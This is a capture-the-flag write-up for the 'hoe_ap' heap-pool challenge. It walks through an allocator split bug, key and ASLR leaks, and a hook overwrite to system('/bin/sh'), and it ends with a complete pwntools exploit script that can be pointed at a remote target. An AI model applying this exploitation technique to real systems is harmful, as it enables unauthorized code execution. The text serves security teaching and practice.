## Challenge Overview

|                     |                                                         |
| ------------------- | ------------------------------------------------------- |
| **Target**    | `nc <ip> <port>`                               |
| **Files**     | `hoe_ap`, `libc.so.6`, `ld-linux-x86-64.so.2`     |
| **Objective** | Execute a shell on the remote service and read the flag |

The challenge statement sets the scene: two forked actors share one handle-only pool, and no raw pointer ever leaves it.

> The people actually think sharing is caring :(
>
> No pointers leave the pool. You only ever get a handle.
>

The binary implements a **handle-based memory pool**: user code never receives a raw pointer,
only a small integer *handle*. Two forked processes ("actor A" and "actor B") share one pool
and take turns issuing commands, and the whole session is limited to 48 commands. The goal is
to break out of the abstraction and gain code execution, then read the flag from the remote
filesystem.

## Attack Chain

```mermaid
flowchart TD
    %% ---------- Target ----------
    T0["Target: hoe-ap<br/>stripped PIE · Full RELRO · NX · Canary<br/>glibc 2.43 shipped with the challenge"]:::target
    T1["Attacker: connect to the service<br/>nc &lt;ip&gt; &lt;port&gt;"]:::attacker
    T2["Target: handle-only pool in a MAP_SHARED mmap<br/>289 cells × 0x20 · freelists[6] · zone_used[3] · 48 turns<br/>cell = tier, live, link, span, magic, holder"]:::target

    %% ---------- Reconnaissance ----------
    R1["Recon: reverse take / drop / write / read<br/>every transfer length comes from cell.span"]:::attacker
    R2["Recon: magic = tier ^ key with a getrandom key<br/>ownership and bounds live in check_handle"]:::attacker

    %% ---------- Vulnerability ----------
    V1{{"VULN: the split never shrinks the returned cell<br/>init_cell fixes only the remainder, so<br/>X.data with span 0x3f8 covers R = X+1 header at +0x18"}}:::vuln

    %% ---------- Step 1: build the overlap ----------
    S1["Attacker: A take tier 5 (32-cell bulk), drop it<br/>A take tier 0 returns it with the stale span"]:::attacker
    S1r["Target: split creates R = X+1 (tier 4)<br/>freelist[4] = R · audit X shows span=1016"]:::target

    %% ---------- Step 2: leak the session key ----------
    S2["Attacker: grant X → B, B reads X = 1016 bytes"]:::attacker
    S2r["Target: R header at +0x18: tier=4 · magic=0x77<br/>key = 0x77 ^ 4 = 0x73"]:::target
    N1["guard: magic = tier ^ key<br/>the key is leaked, not guessed"]:::note

    %% ---------- Step 3: forge the free-list link ----------
    S3["Attacker: A writes X = 1016 bytes<br/>R.link = 0 while tier / span / magic stay valid"]:::attacker
    S3r["Target: freelist[4] = R -> cell 0 -> END"]:::target

    %% ---------- Step 4: allocate cell 0 ----------
    D1{"Attacker: take tier 4 —<br/>which handle?"}:::decision
    S4a["Attacker: handle X+1 = R — take tier 4 again"]:::attacker
    S4b["Target: cell 0 allocated<br/>magic = key passes as 0 ^ key · span stays 0x18"]:::target
    N2["guard: RNG free-list pick<br/>never predicted — branch on the printed handle"]:::note

    %% ---------- Step 5: leak PIE and libc ----------
    S5["Attacker: grant 0 → B, B reads 0 = 24 bytes"]:::attacker
    S5r["Target: [hook = PIE+0x15d0] [arg = PIE+0x32c0] [puts@libc]<br/>PIE = hook - 0x15d0 · libc = puts - 0x8e860"]:::target
    N3["guard: ASLR on PIE + libc<br/>both bases fall out of one 24-byte read"]:::note

    %% ---------- Step 6: hijack the hook ----------
    S6["Attacker: B grant 0 → A<br/>A writes 0: hook = system · arg = '/bin/sh' · third = puts"]:::attacker
    S6r["Target: B sync calls [pool+8] with [pool+0x10]<br/>= system('/bin/sh')"]:::target

    %% ---------- Result ----------
    S7["Target: interactive shell on the socket<br/>uid=1001(ctf)"]:::target
    F["FLAG<br/>pwn{sh4r1ng_th3_p00l_w4s_4_b1g_m1st4k3_179465893<br/>9acIKOIWw051c23e0e18bbf2aa4b70fb458a86ca07790dc8<br/>0_523}"]:::flag

    %% ---------- Edges ----------
    T0 --> T1 --> T2 --> S1
    T0 --> R1 --> R2 --> V1 --> S1
    S1 --> S1r --> S2 --> S2r --> S3
    S3 --> S3r --> D1
    D1 -->|handle = X+1| S4a --> S4b
    D1 -->|handle = 0| S4b
    S4b --> S5 --> S5r --> S6 --> S6r --> S7 --> F
    S2r -.-> N1
    D1 -.-> N2
    S5r -.-> N3

    %% ---------- Roles ----------
    classDef target fill:#272044,stroke:#65e7e3,color:#fff7de
    classDef attacker fill:#272044,stroke:#ff5e9d,color:#fff7de
    classDef decision fill:#272044,stroke:#ffb347,color:#fff7de
    classDef vuln fill:#272044,stroke:#ffb347,stroke-width:3px,color:#fff7de
    classDef note fill:#272044,stroke:#baaed6,stroke-dasharray:4 2,color:#baaed6
    classDef flag fill:#272044,stroke:#ff5e9d,stroke-width:3px,color:#fff7de
```



The free-list pick is the only branch, and the exploit never predicts it — it branches on the handle the program prints. The session key, the PIE base and the libc base are all read out of the pool, so the `magic` check, ASLR and the allocator's randomisation are bypassed with data rather than guesses.

## Initial Analysis

### File triage

```bash
$ file hoe_ap
hoe_ap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
        interpreter /lib64/ld-linux-x86-64.so.2,
        BuildID[sha1]=244f963b252bfc30af3ac7782de9b7ba4cb8ba1d,
        for GNU/Linux 3.2.0, stripped

$ readelf -dW hoe_ap | grep -E 'BIND_NOW|FLAGS'
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
```

The protections can be summarised with pwntools:

```python
>>> from pwn import *
>>> e = ELF('hoe_ap', checksec=False)
>>> e.pie, e.canary, e.nx, e.relro
(True, True, True, 'Full')
```

- **PIE + Full RELRO** — a GOT overwrite is off the table, and we will need a code leak.
- **NX** — the shared pool is mapped `PROT_READ | PROT_WRITE` only, so no shellcode.
- **Stack canary** — stack overflows are out of scope as well.

The supplied `libc.so.6` is the exact library used by the remote service (Ubuntu glibc 2.43),
which gives us reliable offsets:

| Symbol        | Offset in libc |
| ------------- | -------------- |
| `puts`      | `0x8e860`    |
| `system`    | `0x5c2e0`    |
| `"/bin/sh"` | `0x1db799`   |

### The program: two actors, one pool

Reversing `main` (0x1040) reveals the architecture of the challenge:

```c
getrandom(&rng_seed, 8, 0);                  /* splitmix64 state for the allocator */
getrandom(&key, 1, 0);                       /* per-session cell "magic" key        */
base = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
init_pool(base);                             /* cell[0] + pool metadata             */
pipe(p0); pipe(p1); pipe(p2);
fork();                                      /* actor A */
fork();                                      /* actor B */
for (;;) {
    read_line(&who, 8);                      /* "A", "B" or "q" */
    write(actor[who].cmd_pipe, "\x01", 1);   /* give this actor one turn */
    read(p2[0], &b, 1);                      /* wait until it is done    */
}
```

Two details are important:

1. The pool is mapped **`MAP_SHARED`**, so both forked actors operate on the *same* memory.
   The parent process only serialises their turns — every command is atomic.
2. The allocator's RNG seed and the cell "magic" key come from **`getrandom()`**. They are
   unpredictable, so the allocator's random choices cannot be precomputed — the key has to be
   *leaked* from memory.

### The pool layout

The 0x3000-byte mapping is divided into 289 fixed-size cells (`0x20` bytes each) followed by a
small metadata structure:

```
base + 0x0000   cell[0]                 actor record (the "hooks")
base + 0x0020   cell[1]  .. cell[96]    zone 0
base + 0x0c20   cell[97] .. cell[192]   zone 1
base + 0x1820   cell[193].. cell[288]   zone 2
base + 0x2420   pool struct
                ├─ +0x00  u16 freelist[6]   free-list head per tier (0xffff = empty)
                ├─ +0x0c  u16 zone_used[3]  cells consumed per zone
                ├─ +0x14  u32 turns         command budget (dies above 0x2f)
                └─ +0x18  u8  bitmap[289]   "cell ever initialised" flags
```

Each cell is laid out like this:

| Offset   | Size | Field                                                              |
| -------- | ---- | ------------------------------------------------------------------ |
| `0x00` | 1    | `tier` — size class, `0..5`                                   |
| `0x01` | 1    | `live` — 1 while allocated                                      |
| `0x02` | 2    | `link` — next free cell index (freelist link, `0xffff` = end) |
| `0x04` | 2    | `span` — number of *data* bytes available at `+0x08`        |
| `0x06` | 1    | `magic` — `tier ^ key`, an anti-tamper checksum               |
| `0x07` | 1    | `holder` — 1 = actor A, 2 = actor B, 0 = nobody                 |
| `0x08` | 24   | data area                                                          |

The size classes (tiers) are powers of two cells:

| Tier | Name      | Cells | `span` (data bytes) |
| ---- | --------- | ----- | --------------------- |
| 0    | `nano`  | 1     | 24                    |
| 1    | `tiny`  | 2     | 56                    |
| 2    | `small` | 4     | 120                   |
| 3    | `mid`   | 8     | 248                   |
| 4    | `wide`  | 16    | 504                   |
| 5    | `bulk`  | 32    | 1016                  |

Because a cell's data area is `cells * 0x20 - 8` bytes, a multi-cell allocation reaches into
the *headers* of the following cells — which is exactly what the bug will let us abuse.

### The command set

Both actors expose the same menu; the command numbers differ slightly in meaning:

| # | Actor A                                        | Actor B                                      |
| - | ---------------------------------------------- | -------------------------------------------- |
| 1 | `take` (tier, label)                         | `take` (tier, label)                       |
| 2 | `drop` (handle)                              | `drop` (handle)                            |
| 3 | `write` — read `span` bytes into the cell | `read` — print `span` bytes of the cell |
| 4 | `audit` — print tier/span/holder/link       | `verify` — per-zone live count + a digest |
| 5 | `sweep` — free every cell held by A         | `sync` — `call [pool+8]([pool+0x10])`   |
| 6 | `grant` — hand a handle to A or B           | `grant`                                    |
| 7 | `tiers` — list size classes                 | `tiers`                                    |
| 0 | idle                                           | idle                                         |

### Integrity checks

Every operation that takes a handle goes through a single validation function:

- the index must be `<= 0x120`,
- the cell must be `live`,
- `holder` must match the calling actor,
- `tier <= 5`,
- and `magic == tier ^ key`.

The `read`/`write` commands use the cell's **own `span` field** as the transfer length, capped
by a zone guard: the access must end at or before `base + zone_end*0x20`, where
`zone_end = ((handle-1)/96)*96 + 97`. For **handle 0** the guard is special-cased to 0x20 bytes
total, so a `span` of `0x18` (24 bytes) is accepted — remember this, it becomes our hijack.

## Solution

### Step 0 — Reproducing the target locally

The shipped loader and libc make local testing byte-for-byte identical to the remote:

```bash
$ ./ld-linux-x86-64.so.2 --library-path . ./hoe_ap
hoe-ap :: one pool, two actors, no pointers.
pool nominal
actor? (A/B/q)
```

The exploit script included at the end runs this local setup by default and switches to the
remote server with `python3 exploit.py remote`.

### Step 1 — The bug: a split that forgets to shrink `span`

`take(tier)` works like a classic segregated free-list allocator:

1. Walk the free lists from the requested tier up to tier 5.
2. Count the chain and unlink a random node (`k = rng() % count`) — a deliberate anti-exploit
   randomisation.
3. If the found block is **larger** than requested, *split* it: a new cell is created at
   `found + requested_cells` via `init_cell()`, which sets its own tier/magic/span and pushes it
   onto the free list of the largest tier that fits the remainder.
4. Finally, the allocator marks the found cell `live`, sets `tier = requested_tier`,
   `magic = key ^ requested_tier`, `holder = actor` — **and leaves the old, larger `span`
   untouched**.

Step 4 is the vulnerability. The returned cell claims the small tier in its `tier` byte, but
its `span` still describes the entire original block, and the tail of that block was handed back
to the free lists:

```
cell X    : [ hdr ][ data ...................................... span 0x3f8 ]
cell X+1  :        [ hdr ][ data ............... span 0x1f8 ]   (free, tier 4)
                   ^
                   └── offset 0x18 inside X's data — the overlap
```

The remainder cell `X+1` is a normal, free (tier 4) cell, but its 16-byte header now sits *inside*
the data area of the cell `X` that was just returned to us. Writing through `X` lets us rewrite
`R`'s metadata — including its `magic` and its free-list `link`.

Observed proof from the run (the audited `span` should have been `0x18` for a nano cell, but
still reports the bulk size):

```
handle 193: tier=0(nano) span=1016 holder=1 link=65535
```

### Step 2 — Leak the session key through the overlap

The `magic` byte protects free cells from being tampered with, and it is computed with the
per-session `key` we do not know. However, the remainder cell was initialised by `init_cell()`
with a valid `magic = tier ^ key`, and we can *read* it.

Actor A takes a bulk block (`X`), drops it, and takes a nano cell. The allocator returns `X`
with the stale bulk `span`, and the split creates the remainder `R = X+1` (tier 4). A then
`grant`s `X` to actor B, and B reads all 1016 bytes:

```python
tier, live, link, span, magic, holder = data[0x18], data[0x19], \
    u16(data[0x1a:0x1c]), u16(data[0x1c:0x1e]), data[0x1e], data[0x1f]
```

Real output from the remote run:

```
R hdr: tier=4 live=0 link=0xffff span=0x1f8 magic=0x77 holder=0
key = 0x73                # 0x77 ^ 4
```

The key falls straight out of `magic ^ tier`, and with it we can forge perfectly valid cell
headers.

### Step 3 — Forge a free-list link that points at cell 0

A free cell's `link` field is the index of the next cell on the same tier's free list. If the
remainder's `link` is set to `0`, the tier-4 free list becomes:

```
freelist[4] -> R (X+1) -> cell 0 -> END
```

Cell 0 is special: it is the **actor record** created at startup, not a normal allocation, and
its "data" area holds the pointers used by the `sync` command:

| Offset    | Contents                                                          |
| --------- | ----------------------------------------------------------------- |
| `+0x08` | `hook` — function pointer (`print_status`, PIE + `0x15d0`) |
| `+0x10` | argument pointer (`"pool nominal"`, PIE + `0x32c0`)           |
| `+0x18` | `puts` (from libc)                                              |

Actor A writes the remainder's header back through `X`, keeping `tier`, `span` and `magic`
consistent (so the allocator's integrity check still passes) while setting `link = 0`.
The write is 1016 bytes long because the length comes from the cell's stale span — that is the
whole point of the primitive.

### Step 4 — Allocate cell 0

Actor A now calls `take` with tier 4. The free list is `R -> cell0`, so the allocator's random
pick returns either `R` or `cell0`; the printed handle tells us which. If it returns `R`
(handle `X+1`), a second `take` finds the free list headed by cell 0 and returns **handle 0**.

Cell 0 passes the allocator's integrity check: its `tier` byte is 0 (within `0..5`) and its
`magic` byte was initialised at startup to exactly `key`, i.e. `0 ^ key`. The allocation then
sets `live = 1`, `tier = 4`, `magic = key ^ 4` and `holder = A`, while `span = 0x18` and the
three pointers stay untouched. Every later handle operation re-validates `live`, `holder` and
`magic` — all of which now hold.

### Step 5 — Leak PIE and libc through handle 0

Because handle 0's `span` is `0x18`, the special-cased zone guard allows exactly 24 bytes of
`read`/`write` at `pool + 8` — precisely the three pointers in the actor record. Actor A
`grant`s the handle to B, and B reads it:

```
handle0 leak: d0459240ac5f0000 c0629240ac5f0000 6078a3c5f9740000
[+] pie=0x5fac40923000 libc=0x74f9c59a9000 strptr=0x5fac409262c0
```

- `hook - 0x15d0` = **PIE base** (`0x5fac409245d0 - 0x15d0 = 0x5fac40923000`),
- the second pointer confirms the leak (`strptr - pie = 0x32c0`),
- `puts - 0x8e860` = **libc base**.

One 24-byte read defeated both ASLR layers.

### Step 6 — Hijack the "hook" and pop a shell

The `sync` command (option 5 for actor B) does:

```c
rax = *(void **)(base + 0x08);      /* hook  */
rdi = *(void **)(base + 0x10);      /* argument */
if (rax) rax(rdi);                  /* call it! */
```

Actor B `grant`s the handle back to A, and A writes 24 bytes:

```python
p64(libc + LIBC_SYSTEM) + p64(libc + LIBC_BINSH) + p64(puts_addr)
```

That turns the hook into `system` and the argument into libc's `"/bin/sh"`. The next `sync`
from actor B executes `system("/bin/sh")` — and since the actors inherit the socket on
stdin/stdout, the shell is attached directly to our connection.

### Step 7 — Read the flag

With a shell attached to the socket, the last step is a plain `cat`:

```bash
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
$ pwd
/app
$ ls -la
total 32
drwxr-x--- 1 root ctf   4096 Nov 14 12:22 .
drwxr-xr-x 1 root root  4096 Nov 14 12:22 ..
-r-xr-x--- 1 root ctf  18504 Nov 11 20:04 hoe_ap
$ cat /flag.txt
pwn{sh4r1ng_th3_p00l_w4s_4_b1g_m1st4k3_1794658939acIKOIWw051c23e0e18bbf2aa4b70fb458a86ca07790dc80_523}
```

The `$FLAG_FILE` variable pointed at `/app/flag.txt`, which did not exist in this deployment;
the flag was actually at `/flag.txt`.

### Turn plan

| #  | Actor | Command                     | Purpose                                                           |
| -- | ----- | --------------------------- | ----------------------------------------------------------------- |
| 1  | A     | `take` tier 5             | allocate a 32-cell bulk block `X`                               |
| 2  | A     | `drop` `X`              | push `X` onto `freelist[5]`                                   |
| 3  | A     | `take` tier 0             | get `X` back with its stale `span`; split creates `R = X+1` |
| 4  | A     | `grant` `X` → B        | let B read the block                                              |
| 5  | B     | `read` `X`              | 1016 bytes; `R`'s header at offset `0x18`; recover `key`    |
| 6  | B     | `grant` `X` → A        | hand the block back to the writer                                 |
| 7  | A     | `write` `X`             | rewrite `R`'s header: valid tier/span/magic, `link = 0`       |
| 8  | A     | `take` tier 4             | free list is `R -> cell0`; may return `R` or `cell0`        |
| 9  | A     | `take` tier 4 (if needed) | returns **handle 0**                                        |
| 10 | A     | `grant` `0` → B        |                                                                   |
| 11 | B     | `read` `0`              | leak `hook`, argument pointer, `puts`                         |
| 12 | B     | `grant` `0` → A        |                                                                   |
| 13 | A     | `write` `0`             | `hook = system`, argument = `"/bin/sh"`                       |
| 14 | B     | `sync`                    | `call [pool+8]([pool+0x10])` → shell                           |

Thirteen to fourteen commands out of the 48-turn budget, depending on which node the random
free-list pick returns first.

### Why the allocator's randomisation did not stop us

`take` picks both a random node in the free-list chain and (when the free lists are empty) a
random zone. Because the seed comes from `getrandom()`, none of that is predictable. The
exploit therefore never predicts a random choice:

- when the returned handle matters, it reads the printed `handle: %u` and branches,
- the `magic` key is recovered with an information leak instead of being guessed,
- memory that must not be re-used is *held live*, so the allocator cannot touch it.

The same event's MIPS pwn target, [meeeps (gp_slide)](/generated/writeups/Digital-Pakistan-Red-Team-CTF/meeeps.html), shifts `$gp` to hijack a GOT call.

## Flag

The flag was read from `/flag.txt` with the shell obtained in step 6:

**Flag:** `pwn{sh4r1ng_th3_p00l_w4s_4_b1g_m1st4k3_1794658939acIKOIWw051c23e0e18bbf2aa4b70fb458a86ca07790dc80_523}`

## Key Takeaways

- **One stale field is enough.** A split that forgets to shrink the returned cell's `span`
  hands out an object whose data overlaps a free cell's metadata — the classic
  "overlapping objects" primitive.
- **Hiding pointers does not remove memory-safety duties.** The API only exposes integer
  handles, yet the implementation keeps function pointers in the same pool the attacker can
  reach; metadata and user data must never overlap.
- **Integrity checks fail when memory is readable.** `magic = tier ^ key` with a
  `getrandom()` key is solid against blind tampering, but the overlap let us *read* the
  remainder's header and derive the key.
- **Randomisation is not a mitigation by itself.** Random free-list picks and ASLR were both
  defeated with leaks and by branching on the program's own output.
- **The general workflow:** find where metadata is trusted, turn a size/bookkeeping bug into
  an overlap, upgrade the overlap to read/write, leak PIE and libc, then hijack a function
  pointer — here the `sync` "hook", straight into `system("/bin/sh")`.

## Appendix — Full exploit

> Set `CHAL` to the directory that contains `hoe_ap`, `libc.so.6` and `ld-linux-x86-64.so.2`.
> Run `python3 exploit.py` for the local reproduction; use `python3 exploit.py remote` to attack
> the remote service.

```python title="exploit.py"
from pwn import *
import sys, time

context.arch = 'amd64'
CHAL = './pwn-hoe_ap'
LOCAL = not (len(sys.argv) > 1 and sys.argv[1] == 'remote')
HOST, PORT = '<ip>', int('<port>')

LIBC_PUTS   = 0x8e860
LIBC_SYSTEM = 0x5c2e0
LIBC_BINSH  = 0x1db799
PIE_HOOK    = 0x15d0

def start():
    if LOCAL:
        return process([CHAL + '/ld-linux-x86-64.so.2', '--library-path', CHAL, CHAL + '/hoe_ap'], cwd=CHAL)
    return remote(HOST, PORT)

class Game:
    def __init__(self, p):
        self.p = p
        self.p.recvuntil(b"actor? (A/B/q) ")

    def pick(self, actor):
        self.p.send((b'A' if actor == 1 else b'B') + b'\n')

    def recv_menu(self):
        return self.p.recvuntil(b"> ")

    def take(self, actor, tier, label):
        self.pick(actor); self.recv_menu()
        self.p.send(b"1\n")
        self.p.recvuntil(b"tier: ")
        self.p.send(str(tier).encode() + b"\n")
        self.p.recvuntil(b"label: ")
        self.p.send(label.encode() + b"\n")
        self.p.recvuntil(b"handle: ")
        h = int(self.p.recvline().strip())
        self.p.recvuntil(b"actor? (A/B/q) ")
        return h

    def drop(self, actor, handle):
        self.pick(actor); self.recv_menu()
        self.p.send(b"2\n")
        self.p.recvuntil(b"handle: ")
        self.p.send(str(handle).encode() + b"\n")
        self.p.recvuntil(b"actor? (A/B/q) ")

    def read(self, actor, handle):
        self.pick(actor); self.recv_menu()
        self.p.send(b"3\n")
        self.p.recvuntil(b"handle: ")
        self.p.send(str(handle).encode() + b"\n")
        self.p.recvuntil(b"bytes: ")
        n = int(self.p.recvline().strip())
        data = self.p.recvn(n)
        self.p.recvuntil(b"actor? (A/B/q) ")
        return data

    def write(self, actor, handle, data):
        self.pick(actor); self.recv_menu()
        self.p.send(b"3\n")
        self.p.recvuntil(b"handle: ")
        self.p.send(str(handle).encode() + b"\n")
        self.p.recvuntil(b"bytes: ")
        n = int(self.p.recvline().strip())
        assert n == len(data), f"span {n} != payload {len(data)}"
        self.p.send(data)
        self.p.recvuntil(b"actor? (A/B/q) ")

    def grant(self, actor, handle, to_actor):
        self.pick(actor); self.recv_menu()
        self.p.send(b"6\n")
        self.p.recvuntil(b"handle: ")
        self.p.send(str(handle).encode() + b"\n")
        self.p.recvuntil(b"to (A/B): ")
        self.p.send((b'A' if to_actor == 1 else b'B') + b"\n")
        self.p.recvuntil(b"actor? (A/B/q) ")

    def audit(self, actor, handle):
        self.pick(actor); self.recv_menu()
        self.p.send(b"4\n")
        self.p.recvuntil(b"handle: ")
        self.p.send(str(handle).encode() + b"\n")
        out = self.p.recvline()
        self.p.recvuntil(b"actor? (A/B/q) ")
        return out

def exploit():
    p = start()
    g = Game(p)

    # 1. A takes a bulk (tier 5) block -> X (32 cells)
    X = g.take(1, 5, "bulk")
    log.info(f"bulk F={X}")
    # 2. drop it -> freelist[5]
    g.drop(1, X)
    # 3. A takes tier 0 -> F=X with stale span 0x3f8; remainder R=X+1 (tier 4) on freelist[4]
    F = g.take(1, 0, "F")
    assert F == X, f"expected F={X} got {F}"
    log.info("audit F: " + repr(g.audit(1, F)))

    # 4-5. leak key: grant F to B and read 0x3f8 bytes to see R's header
    g.grant(1, F, 2)
    data = g.read(2, F)
    tier, live, link, span, magic, holder = data[0x18], data[0x19], u16(data[0x1a:0x1c]), u16(data[0x1c:0x1e]), data[0x1e], data[0x1f]
    log.info(f"R hdr: tier={tier} live={live} link={hex(link)} span={hex(span)} magic={hex(magic)} holder={holder}")
    key = magic ^ tier
    log.info(f"key = {hex(key)}")
    g.grant(2, F, 1)

    # 6. forge R: keep tier/span/magic, set link=0 (-> cell 0)
    payload = bytearray(b"A" * len(data))
    payload[0x18] = 4
    payload[0x19] = 0
    payload[0x1a:0x1c] = p16(0)
    payload[0x1c:0x1e] = p16(0x1f8)
    payload[0x1e] = 4 ^ key
    payload[0x1f] = 0
    g.write(1, F, bytes(payload))

    # 7-8. take tier 4: may get R (X+1) or cell 0 directly
    h1 = g.take(1, 4, "g1")
    log.info(f"take4 #1 -> handle {h1}")
    if h1 != 0:
        assert h1 == X + 1, f"unexpected handle {h1}"
        h1 = g.take(1, 4, "g2")
        log.info(f"take4 #2 -> handle {h1}")
    assert h1 == 0, "failed to allocate cell 0"

    # 9-10. leak hooks via B read of handle 0
    g.grant(1, 0, 2)
    leak = g.read(2, 0)
    log.info("handle0 leak: " + leak.hex())
    hook, strptr, puts_addr = u64(leak[0:8]), u64(leak[8:16]), u64(leak[16:24])
    pie = hook - PIE_HOOK
    libc = puts_addr - LIBC_PUTS
    log.success(f"pie={hex(pie)} libc={hex(libc)} strptr={hex(strptr)}")
    assert strptr - pie == 0x32c0

    # 11-12. A writes hooks
    g.grant(2, 0, 1)
    g.write(1, 0, p64(libc + LIBC_SYSTEM) + p64(libc + LIBC_BINSH) + p64(puts_addr))

    # 13. B syncs -> system("/bin/sh")
    g.pick(2); g.recv_menu()
    g.p.send(b"5\n")
    time.sleep(0.4)
    allout = b""
    for cmd in [b"id", b"pwd", b"ls -la", b"cat flag.txt", b"cat /flag.txt", b"cat /flag", b"env", b"find / -maxdepth 3 -name 'flag*' 2>/dev/null"]:
        g.p.send(cmd + b"\n")
        time.sleep(0.4)
        try:
            allout += g.p.recv(timeout=0.7)
        except EOFError:
            break
    print(allout.decode(errors='replace'))
    return allout, g.p

if __name__ == "__main__":
    context.log_level = 'info'
    exploit()
```
